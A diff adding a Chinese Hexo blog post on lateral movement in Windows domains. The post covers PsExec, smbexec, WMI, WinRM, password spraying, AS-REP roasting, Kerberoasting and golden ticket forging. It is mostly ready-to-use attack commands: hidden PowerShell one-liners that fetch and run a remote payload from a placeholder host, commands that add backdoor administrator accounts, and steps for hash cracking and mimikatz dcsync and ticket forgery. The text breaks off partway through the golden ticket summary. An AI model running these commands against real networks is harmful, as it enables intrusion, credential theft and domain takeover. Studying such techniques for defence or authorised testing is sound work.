@@ -1,0 +1,1600 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="横向移动(二), InBlog">
+    <meta name="description" content="PSEXEC上线操作如果是工作组情况，最好用PTH认证
+如果是域最好使用票据。
+建立连接可上线的情况
+
+jump psexec Win7.test.local [监听器名]
+
+SMBEXEC上线SMBEXEC工作原理：
+1、建立IPC$连接">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>横向移动(二) | InBlog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+    <style>
+        body{
+            background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+            background-repeat:no-repeat;
+            background-size: 100% 100%;
+            background-attachment:fixed;
+        }
+    </style>
+
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">InBlog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">InBlog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">横向移动(二)</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">内网渗透</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2024-11-11
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    6.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    26 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="PSEXEC上线操作"><a href="#PSEXEC上线操作" class="headerlink" title="PSEXEC上线操作"></a>PSEXEC上线操作</h1><p>如果是工作组情况，最好用PTH认证</p>
+<p>如果是域最好使用票据。</p>
+<p>建立连接可上线的情况</p>
+<p><img src="/images/posts/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20241004190010156.png"></p>
+<pre class="language-none"><code class="language-none">jump psexec Win7.test.local [监听器名]</code></pre>
+
+<h1 id="SMBEXEC上线"><a href="#SMBEXEC上线" class="headerlink" title="SMBEXEC上线"></a>SMBEXEC上线</h1><p>SMBEXEC工作原理：</p>
+<pre class="language-none"><code class="language-none">1、建立IPC$连接
+2、通过服务执行命令
+2、将命令放在%temp%&#x2F;execute.bat中
+3、运行execute.bat文件，将结果存储在C:&#x2F;__output文件中
+4、删除execute.bat
+5、通过客户端读取目标机器的C:&#x2F;__output文件中内容</code></pre>
+
+<p>命令：</p>
+<pre class="language-none"><code class="language-none">smbexec.exe administrator:admin@123@192.168.142.10
+
+smbexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 administrator@192.168.142.10</code></pre>
+
+<h1 id="WMI横向移动"><a href="#WMI横向移动" class="headerlink" title="WMI横向移动"></a>WMI横向移动</h1><pre class="language-none"><code class="language-none">1、执行命令并且输出
+wmic &#x2F;node:IP地址 &#x2F;user:本地用户管理员&#x2F;域管理员 &#x2F;password:密码 process call create &quot;cmd.exe &#x2F;c ipconfig &gt;c:\ip.txt&quot; 2、列出远程主机进程
+wmic &#x2F;node:IP地址 &#x2F;user:本地用户管理员&#x2F;域管理员 &#x2F;password:密码 process list brief
+3、在远程系统上执行bat脚本
+wmic &#x2F;node:IP地址 &#x2F;user:本地用户管理员&#x2F;域管理员 &#x2F;password:密码 process call create c:\test.bat
+4、添加用户
+wmic &#x2F;node:IP地址 &#x2F;user:本地用户管理员&#x2F;域管理员 &#x2F;password:密码 process call create &quot;cmd.exe &#x2F;c net user
+test1 !@#123QWE &#x2F;add &amp;&amp; net localgroup administrators test1 &#x2F;add
+5、执行powershell上线
+wmic &#x2F;NODE:IP &#x2F;user:本地用户管理员&#x2F;域管理员 &#x2F;password:密码 PROCESS call create &quot;powershell.exe -nop -w hidden -c
+\&quot;IEX ((new-object net.webclient).downloadstring(&#39;ps脚本地址&#39;))\&quot;&quot;</code></pre>
+
+<p>条件：</p>
+<pre class="language-none"><code class="language-none">使用条件如下：
+1、wmic命令需要本地管理员或域管理员权限（有UAC也可以）
+2、横向的用户需要是域管理员或者域普通管理员，工作组需要Administratora
+2、135端口开放
+3、开放445（某些脚本需要借助SMB认证）</code></pre>
+
+<p>CS上线</p>
+<ol>
+<li>自带命令上线</li>
+</ol>
+<p>如果是hash，票据等，就可以先PTH，PTT先认证，后面就不用加user和password等</p>
+<pre class="language-none"><code class="language-none">wmic &#x2F;node:IP地址 &#x2F;user:本地用户管理员&#x2F;域管理员 &#x2F;password:密码 process call create &quot;cmd.exe &#x2F;c
+net user test1 !@#123QWE &#x2F;add &amp;&amp; net localgroup administrators test1 &#x2F;add
+
+执行powershell上线
+wmic &#x2F;NODE:IP &#x2F;user:本地用户管理员&#x2F;域管理员 &#x2F;password:密码 PROCESS call create &quot;powershell.exe
+-nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;ps脚本地址&#39;))\&quot;&quot;</code></pre>
+
+<p>2、wmicexec工具，该工具因为还走了一些SMB认证和访问共享等行为，杀软会拦截</p>
+<pre class="language-none"><code class="language-none">wmiexec.exe 域名&#x2F;用户名:密码@目标IP #哈希传递获得shell
+
+wmiexec.exe 域名&#x2F;用户名:密码@目标IP &quot;ipconfig&quot; #执行命令
+
+wmiexec.exe -hashes LM Hash:NT Hash 域名&#x2F;用户名@目标IP #哈希传递获得shell
+
+wmiexec.exe -hashes LM Hash:NT Hash 域名&#x2F;用户名@目标IP &quot;ipconfig&quot; #执行命令
+wmiexec.exe administrator:Admin@123@192.168.41.40 &quot;powershell.exe -nop -w hidden -c IEX
+((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx&#x2F;payload.ps1&#39;))&quot;</code></pre>
+
+<ol start="3">
+<li>wmiexec.vbs脚本</li>
+</ol>
+<blockquote>
+<p>通过VBS调用WMI来模拟PsExec的功能。其可以在远程系统中执行命令并进行回显，获取远程主机的半交互式Shell。wmiexec.vbs支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式</p>
+</blockquote>
+<p>命令：</p>
+<pre class="language-none"><code class="language-none">cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;cmd IP 用户 密码 &quot;命令“ 
+
+上线：cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;cmd 192.168.41.148 administrator Admin@123 &quot;powershell.exe - nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx&#x2F;payload.ps1&#39;))&quot;</code></pre>
+
+<ol start="4">
+<li>Invoke-WMIExec</li>
+</ol>
+<blockquote>
+<p>Invoke-WMIExec是一个powershell脚本在Invoke-TheHash的文件中用法如下</p>
+</blockquote>
+<p><code>Invoke-WMIExec -Target IP -Domain 域 -Username 用户 -Hash hash-Command &quot;calc.exe&quot; –verbose</code></p>
+<p>CS中</p>
+<pre class="language-none"><code class="language-none">步骤
+Invoke-WMIExec.ps1放在CS目录下
+1、powershell-import Invoke-WMIExec.ps1
+
+2、powershell Invoke-WMIExec -Target 192.168.41.20 -Username administrator -Hash
+570a9a65db8fba761c1008a51d4c95ab -Command &quot;powershell.exe -nop -w hidden -c IEX ((new-object
+net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx&#x2F;payload.ps1&#39;))&quot; -verbose</code></pre>
+
+<h1 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h1><blockquote>
+<p>Windows 远程管理 (Windows Remote Management)简称WinRM 是 WS 管理协议的Microsoft</p>
+<p>实现，WS 管理协议是基于标准简单对象访问协议 （SOAP） 的防火墙友好协议，允许来自不同供应</p>
+<p>商的硬件和操作系统之间进行互操作。WS 管理协议规范为系统提供了一种跨 IT 基础结构访问和交换</p>
+<p>管理信息的通用方法。</p>
+</blockquote>
+<p><strong>WinRM端口：</strong></p>
+<p>HTTP是5985端口进行通信</p>
+<p>HTTPS 是5986端口来进行通信</p>
+<p><strong>开启：</strong></p>
+<p>开启WinRM服务 powershell 运行 enable-psremoting或者cmd运行winrm quickconfig（过UAC管理员运行）</p>
+<p><strong>查询开启</strong></p>
+<p>powershell 运行 enable-psremoting或者cmd运行winrm quickconfig提示。</p>
+<p>查询5985或者5986端口看看是否开启</p>
+<p>对方电脑开启后</p>
+<p>1、winrs命令</p>
+<p>在建立了PTH,PTT,PTK之后不需要再进行输入账号密码,使用这种方式杀软不会报毒</p>
+<pre class="language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;[目标IP]:5985 -u:机器名\用户名 -p:xxxxx &quot;ipconfig&quot; 
+
+winrs -r:https:&#x2F;&#x2F;[目标IP]:5985 -u:机器名\用户名 -p:xxxxx &quot;ipconfig&quot; 
+
+winrs -r:http:&#x2F;&#x2F;[目标IP]:5985 -u:机器名\用户名 -p:xxxxx cmd
+
+winrs -r:https:&#x2F;&#x2F;[目标IP]:5985 -u:机器名\用户名 -p:xxxxx cmd</code></pre>
+
+<blockquote>
+<p>Winrs error:WinRM 客户端无法处理该请求。可以在下列条件下将默认身份验证与IP地址结合使用: 传输为 HTTPS 或目标位于 TrustedHosts 列表中，并且提供了显式凭据。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。</p>
+</blockquote>
+<pre class="language-none"><code class="language-none">winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;</code></pre>
+
+<p>2、powershell</p>
+<pre class="language-none"><code class="language-none">Invoke-Command -ComputerName TARGET -ScriptBlock &#123; dir c:\ &#125;
+
+Invoke-Command -ComputerName TARGET -Credential 域名\用户名 -command &#123;Get-Culture&#125;
+
+Invoke-Command -ComputerName TARGET -Credential 域名\用户名 -ScriptBlock &#123;Get-Culture&#125;</code></pre>
+
+<h1 id="喷洒攻击"><a href="#喷洒攻击" class="headerlink" title="喷洒攻击"></a>喷洒攻击</h1><p><strong>一、kerbrute工具</strong></p>
+<blockquote>
+<p>kerbrute使用Go语言开发，github提供了编译好的文件，</p>
+<p>地址： <a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></p>
+</blockquote>
+<p>1、kerbrute工具域内用户枚举</p>
+<pre class="language-none"><code class="language-none">kerbrute.exe userenum--dc 域控IP -d 域名 用户字典</code></pre>
+
+<p>2、Kerbrute域内密码喷洒</p>
+<p>锁定策略:限制次数</p>
+<pre class="language-none"><code class="language-none">kerbrute.exe passwordspray--dc 域控IP -d 域名 用户字典 密码（单密码）（有锁定策略使用）
+kerbrute.exe bruteuser--dc 域控IP -d 域名 密码字典 用户名（没有锁定策略使用）</code></pre>
+
+<p><strong>二、pykerbute工具</strong></p>
+<p>该工具使用python2编写</p>
+<p>用户枚举</p>
+<pre class="language-none"><code class="language-none">EnumADUser.py [域控IP] [域名] [字典] [协议]
+EnumADUser.py 192.168.41.10 abc.com user.txt tcp</code></pre>
+
+<p>密码喷洒,可用Hash</p>
+<pre class="language-none"><code class="language-none">ADPwdSpray.py [域控IP] [域名] [用户名字典] clearpassword [密码]
+
+ADPwdSpray.py [域控IP] [域名] [用户名字典] ntlmhash [哈希值] udp</code></pre>
+
+<p>工作组内主机上线域控如果使用PTT就必须将主机的DNS服务器指向域控,不然票据会失效</p>
+<h1 id="Roasting攻击"><a href="#Roasting攻击" class="headerlink" title="Roasting攻击"></a>Roasting攻击</h1><p>原理:</p>
+<blockquote>
+<p>AS-REP Roasting是一种对用户账号进行离线爆破的攻击方式,他是因为管理员的错误配置导致的，</p>
+<p>该攻击是AS-REP数据包导致的，因为管理员在域控上勾选了【不要求Kerberos】预身份验证</p>
+</blockquote>
+<p><img src="/images/posts/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20241005163240744.png"></p>
+<p>正常的请求，我们输入正确的账号密码才有AS-REP数据包，打钩之后我们不需要提供密码，只需要提供账号，AS就会返回TGT还有加密的sessionkey，因此我们破解该字段内容就可以得到用户的密码</p>
+<p><strong>获取勾选预认证用户列表</strong></p>
+<p>1、域控上执行：</p>
+<pre class="language-none"><code class="language-none">Get-ADUser-Filter&#39;useraccountcontrol-band4194304&#39;-Properties  useraccountcontrol|Format-Tablename</code></pre>
+
+<p>2、在域内主机上执行：</p>
+<pre class="language-none"><code class="language-none">Import-Module.\PowerView.ps1
+
+Get-DomainUser-PreauthNotRequired–Verbose
+
+Get-DomainUser-PreauthNotRequired-Propertiesdistinguishedname-Verbose</code></pre>
+
+<p><strong>获取AS-REQ的ENC-PART</strong></p>
+<p>ASREPRoast.ps1脚本</p>
+<pre class="language-none"><code class="language-none">Import-Module .\ASREPRoast.ps1
+Invoke-ASREPRoast | select-ExpandPropertyHash</code></pre>
+
+<p>工作组用户:</p>
+<p>使用用户字典一个一个去试试,枚举的方式：</p>
+<pre class="language-none"><code class="language-none">impacket-GetNPUsers -dc-ip [域控IP] -usersfile [字典文件] -formatjohn [域名]&#x2F;
+impacket-GetNPUsers -dc-ip 192.168.41.10 -usersfile 1.txt -formatjohn abc.com&#x2F;</code></pre>
+
+<p>Windows版本只支持单用户</p>
+<pre class="language-none"><code class="language-none">GetNPUsers.exe -dc-ip [域控IP] [域名]&#x2F;[用户名] -no-pass
+GetNPUsers.exe -dc-ip 192.168.41.10 abc.com&#x2F;ww -no-pass</code></pre>
+
+<p><strong>暴力破解用户域用户密码</strong></p>
+<ol>
+<li>john</li>
+</ol>
+<pre class="language-none"><code class="language-none">john --wordlist&#x3D;密码字典 part值
+john --wordlist&#x3D;.&#x2F;pass.txt 1.xt </code></pre>
+
+<ol start="2">
+<li>hashcat</li>
+</ol>
+<pre class="language-none"><code class="language-none">hashcat –m 18200 hash.txt 密码字典 –force</code></pre>
+
+<p>我们直接生成的part值中和手册中的值不符合因为少了$23。需要自己手动改一下</p>
+<p>Hashcat命令格式：<a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a> </p>
+<p><img src="/images/posts/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20241005171633858.png"></p>
+<h1 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h1><blockquote>
+<p>Kerberoasting 是域渗透中经常使用的一项技术，是Tim Medin 在 DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin 同时发布了配套的攻击工具 kerberoast。此后，不少研究人员对 Kerberoasting 进行了改进和扩展，在 GitHub 上开发发布了大量工具，使得 Kerberoasting 逐渐发展成为域攻击的常用方法之一。Kerberoast攻击是在TGS_REP的过程中用户将会收到由目标服务实例的NTLM hash加密生成的ST(service ticket)，如果获得这个ST票据，我们可以尝试穷举口令，模拟加密过程，进行破解。</p>
+</blockquote>
+<p>原理：</p>
+<pre class="language-none"><code class="language-none">1、ST票据的加密方式没有强制采用aes256，可以使用MD5的加密
+2、在TGS认证TGT的时候，不管提供的用户是否具有访问目标服务的权限都会返回目标服务的ST</code></pre>
+
+<p><strong>SPN</strong></p>
+<blockquote>
+<p>服务主体名称SPN(Server principal Name SPN)，是服务实例（可以理解为一个服务，比如 HTTP、</p>
+<p>MSSQL）的唯一标识符。Kerberos 身份验证使用SPN将服务实例与服务帐户相关联。在域中如果有</p>
+<p>多个服务，每个服务必须有自己的SPN和用户，一个用户可以有多个SPN，但是SPN只能对应一个用</p>
+<p>户</p>
+</blockquote>
+<p>SPN注册</p>
+<pre class="language-none"><code class="language-none">1、setspn –U –S HTTP&#x2F;PC-ZS.ABC.COM wanli
+注册一个SPN 是HTTP服务对用的电脑是PC-ZS ,在域用户wanli下
+2、setspn –C –S HTTP&#x2F;PC-ZS.ABC.COM
+将HTTP服务的SPN注册到当前机器用户下</code></pre>
+
+<p><strong>SPN探测</strong></p>
+<p>域内用户</p>
+<pre class="language-none"><code class="language-none">1、setspn命令
+Setspn –Q *&#x2F;* 查询所有的SPN
+Setspn –T abc.com –Q *&#x2F;* 查询指定域中的SPN
+
+2、PowerView
+Import-Module .\PowerView.ps1
+Get-NetUser –SPN
+这个脚本可以查询域用户注册的SPN，机器用户注册的查不了
+
+3、GetUserSPNs脚本，直接导入即可</code></pre>
+
+<p>非域内的主机，可以通过adfind,但是必要提供一个域中的账号密码</p>
+<pre class="language-none"><code class="language-none">1、域内机器：Adfind.exe -b &quot;dc&#x3D;abc,dc&#x3D;com&quot; -f &quot;&amp;(servicePrincipalName&#x3D;*)&quot; servicePrincipalName
+
+2、非域机器：Adfind.exe -h [域控IP]:389 -u 域前缀\用户名 -up 密码 -f &quot;&amp;(servicePrincipalName&#x3D;*)&quot; servicePrincipalName
+
+Adfind.exe -h 192.168.41.10:389 -u abc\ww -up Admin@123 -f &quot;&amp;(servicePrincipalName&#x3D;*)&quot; servicePrincipalName
+查找高权限的SPN
+Adfind.exe -h 192.168.41.10:389 -u abc\ww -up Admin@123 -f &quot;&amp;(servicePrincipalName&#x3D;*)(admincount&#x3D;1)&quot; servicePrincipalName</code></pre>
+
+<p><strong>获取高权限SPN服务票据</strong></p>
+<p>SPN就是用来破解SPN对应账户的密码但是SPN的可以注册在机器用户下和域用户下</p>
+<p>1、机器用户下（机器用户的密码是不可能获取到的，他是随机的，是无法进行破解的）</p>
+<p>2、域用户下（SPN可以注册在任何的域用户下，所以需要查询高权限的域用户下的SPN）</p>
+<p><strong>在非域主机的电脑上：</strong></p>
+<p>1、impacket工具下面的GetUserSPNs工具，这个工具在域主机和非域主机都可以使用</p>
+<p>获取域中所有注册SPN的用户ST票据,前提是要能通讯域控</p>
+<pre class="language-none"><code class="language-none">1、GetUserSPNs.exe -request -dc-ip [域控IP] [域名]&#x2F;[用户名]:[密码] -outputfile [导出文件路径]
+GetUserSPNs.exe -request -dc-ip 192.168.41.10 abc.com&#x2F;ww:Admin@123 -outputfile 1.txt
+
+2、GetUserSPNs.exe -request -dc-ip [域控IP] [域名]&#x2F;[用户名]:[密码] -outputfile [导出文件路径] -request-user [用户名]  指定用户
+GetUserSPNs.exe -request -dc-ip 192.168.41.10 abc.com&#x2F;ww:Admin@123 -outputfile 1.txt -
+request-user wanli</code></pre>
+
+<p>2、Rubeus工具，这个工具不能用于工作组的电脑，因为不支持认证，在域中的电脑执行如下</p>
+<pre class="language-none"><code class="language-none">Rubeus.exe kerberoast &#x2F;format:john &#x2F;outfile:1.txt   导出所有用户的哈希值</code></pre>
+
+<p>3、可以使用mimikatz直接申请ST票据，然后从内存中导出来</p>
+<pre class="language-none"><code class="language-none">Setspn –Q *&#x2F;* 查询所有的SPN
+
+kerberos::ask &#x2F;target:[服务名] 申请票据保存在内存中
+kerberos::ask &#x2F;target:MYSQL&#x2F;PC-ZS 
+
+kerberos::list &#x2F;export 导出所有票据</code></pre>
+
+<p><strong>破解用户ST票据HASH</strong></p>
+<p>1、使用tgsrepcrack脚本</p>
+<pre class="language-none"><code class="language-none">Python2 tgsrepcrack.py 密码字典 票据</code></pre>
+
+<p>2、Hashcat</p>
+<p>Hash格式的（分为john格式和hacat格式一般都是hashcat）：</p>
+<pre class="language-none"><code class="language-none">Hashcat –m 13100 [hash文件] [密码字典] --force
+Hashcat –m 13100 hash.txt pass.txt --force</code></pre>
+
+<p><strong>kerberoasting攻击总结</strong></p>
+<p>1、检查电脑是否加入域</p>
+<pre class="language-none"><code class="language-none">1、如果是工作组（先用喷洒得到一个域用户和密码）
+2、然后使用Adfind查询可以利用的SPN
+3、如果加入了域直接使用工具查询高权限的SPN</code></pre>
+
+<p>2、找到可利用的SPN用户获取该用户的ST票据（这里使用加入域的电脑）</p>
+<pre class="language-none"><code class="language-none">Rubeus.exe kerberoast &#x2F;format:john &#x2F;outfile:hash.txt</code></pre>
+
+<p>3、使用hashcat破解密码</p>
+<pre class="language-none"><code class="language-none">Hashcat –m 13100 hash pass --force</code></pre>
+
+<p>4、得到用户的hash值之后，获取该用户的PTT票据</p>
+<pre class="language-none"><code class="language-none">shell getTGT.exe test.local&#x2F;admin:password</code></pre>
+
+<p>5、使用mimikatz将票据注入的内存中</p>
+<pre class="language-none"><code class="language-none">Mimikatz: Kerberos:ptc</code></pre>
+
+<p>6、横向移动进行上线</p>
+<pre class="language-none"><code class="language-none">shell wmic &#x2F;NODE:IP PROCESS call create &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;ps脚本地址&#39;))\&quot;&quot;</code></pre>
+
+<h1 id="黄金票据-Golden-Ticket"><a href="#黄金票据-Golden-Ticket" class="headerlink" title="黄金票据(Golden Ticket)"></a>黄金票据(Golden Ticket)</h1><p>黄金票据发生在 AS-REP的阶段，黄金票据就是伪造TGT</p>
+<p><strong>黄金票据的作用：</strong></p>
+<pre class="language-none"><code class="language-none">1、可以用来权限维持
+2、可以用来横向移动</code></pre>
+
+<p><strong>利用条件:</strong></p>
+<p>1、必须知道KDC秘钥分发中心账户KRBTGT的hash值（重要）<br>2、域名（）</p>
+<p>3、域的SID值<br>域的SID值（在域中执行whoami &#x2F;all)</p>
+<p><img src="/images/posts/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20241006141536516.png"></p>
+<p>4、需要伪造的用户（一般都是域管理员）administrator</p>
+<p><strong>KRBTGT-Hash值获取方式</strong></p>
+<p>获取KRBTGT的hash值，该值的有两种方式</p>
+<p>1、控制了域控然后查询</p>
+<p>2、通过dcsync查询</p>
+<p>1、krbtgt是域用户，不是域控上的本地用户所以存储不在域控的SAM文件中，而是在ntds文件中</p>
+<p>2、如果没有控制域控，可以通过dcsync的技术获取</p>
+<p>高权限用户</p>
+<pre class="language-none"><code class="language-none">mimikatz lsadump::dcsync &#x2F;domain:abc.com &#x2F;user:krbtgt</code></pre>
+
+<p><img src="/images/posts/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20241006142031694.png"></p>
+<p>黄金票据制作方式</p>
+<p>1、impacket中的工具TICKETER(本工具是本地生的)</p>
+<pre class="language-none"><code class="language-none">ticketer -domain-sid [krbtgt的sid值] -nthash [krbtgt-hash] -domain 域名 伪造的用户
+
+ticketer -domain-sid S-1-5-21-2716900768-72748719-3475352185 -nthash 1e01cab49f16c599465b754c96e5ae4d -domain abc.com administrator</code></pre>
+
+<p>2、可以使用mimikatz直接生成然后注入到内存（和CS中自带功能是一样）</p>
+<pre class="language-none"><code class="language-none">kerberos::golden &#x2F;user:[伪造用户] &#x2F;domain:域名 &#x2F;sid:[SID值] &#x2F;krbtgt:[NTLM-HASH] &#x2F;ptt
+
+kerberos::golden &#x2F;user:administrator &#x2F;domain:abc.com &#x2F;sid:S-1-5-21-2716900768- 72748719-3475352185 &#x2F;krbtgt:1e01cab49f16c599465b754c96e5ae4d &#x2F;ptt</code></pre>
+
+<p>不加&#x2F;ptt就会本地生成.Kirbi文件，mimikatz在导入也是一样的效果，可保存到本地用于权限维持，也可本地生成防杀软</p>
+<p><strong>总结上线:</strong></p>
+<ol>
+<li>对服务器进行域内信息收集，并且检查自身的权限，如果是管理员权限直接dcsync</li>
+</ol>
+<pre class="language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:abc.com &#x2F;user:krbtgt</code></pre>
+
+<ol start="2">
+<li><p>获取伪造TGT的其他条件【域SID】【域名】</p>
+</li>
